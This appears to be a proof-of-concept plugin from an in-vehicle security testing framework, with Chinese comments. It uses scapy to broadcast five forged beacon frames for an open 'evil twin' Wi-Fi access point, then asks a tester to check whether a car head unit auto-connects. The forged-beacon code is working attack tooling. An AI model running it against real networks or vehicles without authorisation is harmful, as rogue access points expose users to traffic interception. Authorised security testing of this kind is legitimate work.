#!/usr/bin/env python3
"""
PoC Name: WiFi Evil Twin AP
Identifier: CWE-300
Component: Wireless Stack
Category: Wireless
Severity: High
CVSS: 7.0
Description: 创建同名伪造AP测试自动连接行为
Prerequisites: 支持Monitor模式的无线网卡 (如 wlan0mon)，并已安装 scapy。
Usage: python3 03_CWE_300_WiFi_Evil_Twin_Active_Validation.py <interface>
"""
from __future__ import annotations

import sys
import time
from iv_plugin_base import IVIVulnerabilityPlugin

VULN = {
    "id":             0,
    "cve":            "CWE-300",
    "year":           300,
    "domain":         "wireless",
    "vendor_product": "Unknown",
    "component":      "Unknown",
    "type":           "Unknown",
    "summary":        "WiFi Evil Twin",
    "source_url":     "https://cwe.mitre.org/data/definitions/300.html",
    "affected":       [{"vendor": "Unknown", "product": "Unknown", "versions": []}],
    "references":     ["https://cwe.mitre.org/data/definitions/300.html"],
    "signature_tokens": ["CWE-300"],
}


def _run_poc(plugin, vuln=None) -> dict:
    """
    CWE-300 主动探针包装（兼容旧式 exploit() 实现）。
    通过调用插件自身的 exploit 逻辑并将结果标准化为 detection_confidence 格式。
    """
    try:
        result = plugin.exploit() or {}
    except Exception as exc:
        result = {"error": str(exc)}

    vulnerable = result.get("vulnerable", None)
    evidence = {
        "cve":       vuln.get("cve", "CWE-300") if vuln else "CWE-300",
        "target":    getattr(plugin, "target_ip", "unknown"),
        "technique": "legacy exploit() wrapper",
        "raw":       str(result)[:300],
    }

    # 根据是否有主动网络调用推断等级
    level = "B" if vulnerable is True else ("C" if vulnerable is False else "D")
    try:
        from probe_utils import detection_confidence as _detection_confidence
        return _detection_confidence(level, evidence, vulnerable=vulnerable)
    except ImportError:
        return {
            "detection_confidence": {
                "level": level, "vulnerable": vulnerable,
                "evidence": evidence, "method": "legacy_wrapper",
            }
        }


class EvilTwinPlugin(IVIVulnerabilityPlugin):
    meta_display_id = "POC-WIRELESS-003"
    meta_poc_name = 'CWE-300 WiFi Evil Twin Active Validation'
    meta_cve_id = "CWE-300"
    meta_source_url = "https://cwe.mitre.org/data/definitions/300.html"
    meta_references = ['https://cwe.mitre.org/data/definitions/300.html']
    meta_severity = "High"
    meta_protocol = "wifi"
    meta_profiles = ["wifi"]
    meta_target_os = ["all"]
    meta_required_params = ["interface"]
    requires_manual_review = True
    is_disruptive = True
    meta_destructive_level = "Disruptive"

    def check_prerequisites(self):
        try:
            import scapy.all as scapy
        except ImportError:
            self.logger.error("未安装scapy工具。请执行: pip install scapy")
            return False
            
        self.interface = self.params.get("interface", "")
        if not self.interface:
            self.logger.error("未指定无线网卡接口 (如 wlan0mon)。")
            return False
        return True

    def exploit(self):
        self.logger.info(f"准备部署 Evil Twin AP (Beacon Flood)，使用网卡: {self.interface}")
        try:
            from scapy.all import RadioTap, Dot11, Dot11Beacon, Dot11Elt, sendp
            
            ssid = self.params.get("ssid", "Vehicle_Free_WiFi")
            bssid = "00:11:22:33:44:55"
            
            self.logger.info(f"伪造 SSID: {ssid}")
            self.logger.info(f"伪造 BSSID: {bssid}")

            # 构造 802.11 Beacon 帧 (未加密网络)
            dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=bssid, addr3=bssid)
            beacon = Dot11Beacon(cap="ESS")
            essid = Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
            frame = RadioTap()/dot11/beacon/essid
            
            self.logger.info("开始发送伪造热点信标 (安全验证模式，仅发 5 帧)...")
            try:
                sendp(frame, iface=self.interface, inter=0.1, count=5, verbose=False)
                self.logger.info("伪造热点信标发送完毕。")
            except OSError as e:
                self.logger.error(f"设备发送失败，请检查网卡是否支持 Monitor 模式: {str(e)}")
                return {
                    "status": "error",
                    "details": str(e)
                }
                
            self.logger.warning("[!] 请检查目标车机是否自动连接到了未加密的同名热点。")
            
            return {
                "status": "success",
                "vulnerable": False,
                "details": (
                    f"同名 Beacon 已广播，需人工确认目标车机是否自动连接到伪造热点、是否发起 DHCP/ARP/"
                    "应用层请求，再判定是否存在自动接入风险。"
                )
            }

        except Exception as e:
            self.logger.error(f"Execution Error: {str(e)}")
            return {
                "status": "error",
                "details": str(e)
            }

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 03_CWE_300_WiFi_Evil_Twin_Active_Validation.py <interface>")
        sys.exit(1)
    plugin = EvilTwinPlugin({"interface": sys.argv[1]})
    plugin.run_verify()
